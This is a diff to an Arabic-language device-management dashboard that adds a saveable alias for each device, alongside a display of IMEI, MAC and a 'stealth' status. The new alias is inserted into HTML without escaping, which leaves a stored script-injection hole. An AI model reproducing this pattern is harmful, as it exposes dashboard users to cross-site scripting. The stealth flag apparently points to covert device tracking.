@@ -264,6 +264,17 @@ async function refreshDevices() {
   }
 }
 
+async function saveAlias() {
+  const input = document.getElementById('aliasInput');
+  if (!input || !selectedDevice) return;
+  const alias = input.value.trim();
+  const { error } = await sb.from('devices').update({ alias }).eq('device_serial', selectedDevice.device_serial);
+  if (error) { toast('فشل الحفظ: ' + error.message); return; }
+  selectedDevice.alias = alias;
+  toast('تم حفظ الكنية بنجاح');
+  refreshDevices();
+}
+
 function renderDeviceList() {
   const el = document.getElementById('deviceList');
   el.innerHTML = devices.map(d => {
@@ -271,9 +282,11 @@ function renderDeviceList() {
     const statusClass = d.is_stealth ? 'status-stealth' : (isOnline ? 'status-online' : 'status-offline');
     const statusLabel = d.is_stealth ? 'مخفي' : (isOnline ? 'متصل' : 'غير متصل');
     const active = selectedDevice?.device_serial === d.device_serial ? 'active' : '';
+    const displayName = d.alias || d.device_name || 'Unknown';
     return `<div class="device-item ${active}" onclick="showDeviceDetail('${d.device_serial}')">
-      <div><span class="status ${statusClass}"></span><span class="name">${d.device_name || 'Unknown'}</span></div>
+      <div><span class="status ${statusClass}"></span><span class="name">${displayName}</span></div>
       <div class="detail">${d.manufacturer || ''} ${d.model || ''} · ${d.os_version || ''} · ${statusLabel}</div>
+      <div class="detail">${d.device_name ? '📱 ' + d.device_name : ''}${d.alias ? ' · كنية: ' + d.alias : ''}</div>
       <div class="detail">آخر ظهور: ${d.last_seen_at ? new Date(d.last_seen_at).toLocaleString('ar-SA') : 'لم يظهر بعد'}</div>
     </div>`;
   }).join('');
@@ -291,7 +304,8 @@ async function showDeviceDetail(serial) {
   selectedDevice = devices.find(d => d.device_serial === serial);
   if (!selectedDevice) return;
   renderDeviceList();
-  document.getElementById('mainTitle').textContent = `${selectedDevice.device_name || 'جهاز'} (${selectedDevice.device_serial})`;
+  const titleName = selectedDevice.alias || selectedDevice.device_name || 'جهاز';
+  document.getElementById('mainTitle').textContent = `${titleName} (${selectedDevice.device_serial})`;
   currentTab = 'overview';
   await renderTabContent();
 }
@@ -356,6 +370,7 @@ async function renderOverview(el) {
     <div class="card"><div class="card-header"><h3>معلومات الجهاز</h3></div>
       <table class="data-table">
         <tr><td>Device Serial</td><td>${d.device_serial}</td></tr>
+        <tr><td>الكنية (اسم مخصص)</td><td><input type="text" id="aliasInput" value="${d.alias || ''}" placeholder="أدخل كنية للجهاز" style="background:#0f172a;border:1px solid #334155;border-radius:6px;padding:4px 8px;color:#e2e8f0;width:200px;font-size:13px"> <button class="btn btn-sm btn-primary" onclick="saveAlias()">حفظ</button></td></tr>
         <tr><td>Device Token</td><td style="font-family:monospace;font-size:11px;color:#94a3b8">${d.device_token ? d.device_token.substring(0, 20) + '...' : '—'}</td></tr>
         <tr><td>IMEI</td><td>${d.imei || '—'}</td></tr>
         <tr><td>MAC (WiFi)</td><td>${d.wifi_mac || '—'}</td></tr>
